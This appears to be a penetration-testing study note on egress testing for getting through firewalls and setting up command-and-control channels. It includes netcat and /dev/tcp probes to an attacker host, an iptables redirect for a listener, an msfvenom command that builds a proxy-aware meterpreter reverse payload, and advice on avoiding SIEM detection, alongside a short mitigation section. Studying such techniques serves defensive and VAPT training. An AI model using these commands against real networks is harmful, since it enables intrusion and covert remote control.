---
topic: "73.10 Bypassing Firewalls via Egress Testing"
date: 2026-06-09
author: 'Antigravity'
tags: [network, advanced, pivoting, evasion, vapt]
difficulty: advanced
module: "73 - Advanced Network Pivoting Tunnels and Evasion"
---

# 73.10 Bypassing Firewalls via Egress Testing

## 1. Introduction to Egress Filtering
While ingress filtering (blocking incoming traffic) is a standard security practice implemented flawlessly in almost all modern networks, **egress filtering** (blocking outgoing traffic) is notoriously difficult to implement correctly. Business operations require outbound access: servers need updates (HTTP/S), domain controllers need time synchronization (NTP), and appliances need logging channels (Syslog).
When an attacker compromises an internal node, they must establish a reverse shell or command-and-control (C2) channel back to their infrastructure. If the firewall drops standard outbound ports, the attacker must perform rigorous Egress Testing to discover which ports, protocols, or destinations are permitted out of the network.

## 2. Common Egress Oversight
Administrators often configure firewalls with an explicit "Deny All" for outbound traffic, but subsequently add "Allow" exceptions that attackers exploit:
- **TCP 80/443**: Allowed for web browsing or API access.
- **TCP/UDP 53**: Allowed for DNS resolution.
- **UDP 123**: Allowed for NTP (Network Time Protocol).
- **TCP 21/22**: Allowed for legacy SFTP/SSH administrative tasks.
- **ICMP**: Allowed for network diagnostics.

## 3. ASCII Diagram: Egress Evasion Architecture

```text
    +----------------------------------+
    | Compromised Internal Server      |
    | IP: 10.0.0.50                    |
    | Running: Egress Testing Script   |
    +----------------------------------+
             |
             | SYN to Port 1-65535
             v
    +----------------------------------+
    | Corporate Stateful Firewall      |
    | Rule: DENY ALL OUTBOUND          |
    | Exception: ALLOW TCP 123 (NTP)   |
    | Exception: ALLOW TCP 443 (HTTPS) |
    +----------------------------------+
             |
             | (Port 443, 123 Allowed)
             | (Ports 1-122, 124-442 Dropped)
             v
    +----------------------------------+
    | Attacker C2 Server               |
    | Public IP: 203.0.113.5           |
    | Running: EgressBuster Listener   |
    | Listening on ALL ports (1-65535) |
    +----------------------------------+
             |
             v
      [ Valid Egress Ports Discovered! ]
      [ C2 automatically spins up shell ]
```

## 4. Deep Dive: Egress Testing Methodology

### 4.1 Manual Port Testing
Before employing noisy automated tools, manual testing of common ports is preferred for OPSEC.
Using `Netcat` or `Curl`:
```bash
# On Attacker C2, listen on target port (e.g., 443)
nc -lvnp 443

# On Compromised Host, attempt to connect
nc -vz 203.0.113.5 443
# OR if nc is unavailable, use bash:
echo > /dev/tcp/203.0.113.5/443
```
If the connection establishes, you have found an egress port.

### 4.2 Automated Egress Testing with EgressBuster
When manual testing fails, automated tools test all 65,535 ports. `EgressBuster` is a classic suite consisting of a Python listener and a compiled client.

#### Step 1: Attacker C2 Setup
The attacker runs the listener, which opens sockets on all ports or dynamically responds to incoming SYN packets via iptables.
```bash
# EgressBuster python listener
python egress_listener.py [Attacker_IP]
```
Alternatively, an elegant method using `iptables` to redirect ALL incoming ports to a single Netcat listener:
```bash
# Redirect all TCP traffic to port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 1:65535 -j REDIRECT --to-ports 8080
nc -lvnp 8080
```

#### Step 2: Client Execution
The compromised host runs the client, iterating through ports rapidly.
```bash
# EgressBuster Client
./egress_client 203.0.113.5 1 1000
```
When a connection succeeds, the port is noted, and the attacker can immediately use it to stage a reverse shell.

## 5. Deep Dive: Protocol Smuggling (Deep Packet Inspection)
Modern Next-Gen Firewalls (NGFW) like Palo Alto and Fortinet don't just look at the port; they inspect the payload (Layer 7). If you establish a reverse shell over Port 443, but the traffic isn't valid TLS, the firewall drops the connection.
To bypass DPI:
- **Wrap in TLS**: Use `socat` with OpenSSL, or Metasploit's `reverse_https` payload. The traffic will look like a legitimate HTTPS connection.
- **Domain Fronting**: If the firewall blocks direct IP access and only allows connections to trusted domains (like AWS or Cloudflare), proxy your payload through a high-reputation CDN.
- **HTTP Proxy Evasion**: Internal environments often route all outbound HTTP/S traffic through a transparent proxy (like Squid or BlueCoat) that requires authentication. You must configure your payload to authenticate using the compromised user's Windows credentials or NTLM hash.

## 6. Advanced Scenario: Proxy-Aware Payloads
If outbound access is entirely restricted to an authenticated web proxy, a standard TCP shell will fail.
You must generate proxy-aware payloads using Metasploit:
```bash
# Generating an HTTP payload that inherits system proxy settings
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=203.0.113.5 LPORT=80 HttpProxyType=HTTP HttpProxyHost=10.0.0.10 HttpProxyPort=8080 -f exe > proxy_payload.exe
```
Alternatively, in memory-only operations, PowerShell can automatically inherit the IE proxy settings of the logged-in user:
```powershell
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
# ... proceed with downloading cradle ...
```

## 7. Evasion and OpSec
- **Throttling Scans**: An internal host attempting 65,000 outbound connections in 3 seconds will trigger a massive SIEM alert for port scanning and potential malware beaconing. Throttle the egress testing script to test ports slowly, or randomize the sequence.
- **Target Highly Permissive IPs**: If possible, host your C2 on cloud infrastructure (AWS, Azure, GCP). Firewalls are far less likely to block Microsoft Azure IP ranges than a random DigitalOcean VPS.

## 8. Detection and Mitigation
- **Zero Trust Egress**: The ultimate defense against egress exploitation is a strict default-deny policy, explicitly allowing only necessary traffic from specific source IPs. A database server should have absolutely zero internet access.
- **Proxy Enforced Authentication**: All user-level web traffic should require explicit proxy authentication.
- **Threat Intelligence Integration**: NGFWs should block known C2 infrastructure IPs dynamically.
- **Behavioral Analytics**: Alert on long-lived connections (e.g., an HTTPS connection to a random IP that stays active for 48 hours, typical of a Meterpreter session).

## 9. Comprehensive Configuration Checklist
- Ensure Attacker IPTables allows incoming on all tested ports.
- Ensure Cloud Provider Security Groups (AWS/Azure) allow ingress on all ports for the listener.
- Always test UDP vs TCP separately. Egress rules are often misconfigured for UDP protocols (like NTP/Syslog).

## 10. Chaining Opportunities
- **Egress to DNS Tunneling**: If automated egress testing discovers that NO TCP/UDP ports are allowed outbound, immediately pivot your strategy to [[09 - DNS Tunneling Iodine dnscat2]].
- **Egress to Portfwd**: Once a valid egress port is found, establish a Meterpreter session and utilize [[06 - Meterpreter Portfwd and Autoroute]] to open internal SOCKS proxies.

## 11. Related Notes
- [[08 - ICMP Tunneling PingTunnel]]
- [[09 - DNS Tunneling Iodine dnscat2]]
- [[11 - Proxychains and ProxyChains-NG]]
- [[12 - SSH Dynamic Port Forwarding]]
- [[14 - Evasion via Living Off The Land (LOLBins)]]
